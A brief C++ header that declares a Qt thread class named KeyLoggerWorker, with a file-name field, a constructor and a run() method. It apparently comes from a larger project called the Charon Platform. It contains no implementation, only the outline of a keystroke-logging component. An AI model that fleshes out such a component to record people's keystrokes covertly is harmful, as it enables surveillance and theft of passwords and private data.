// Copyright 2016 The Charon Platform Authors.
// All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

#include <QThread>
#include <QtCore>

class KeyLoggerWorker : public QThread
{
  public:
  QString m_fileName;

  explicit KeyLoggerWorker(QString fileName);
  void run();
};
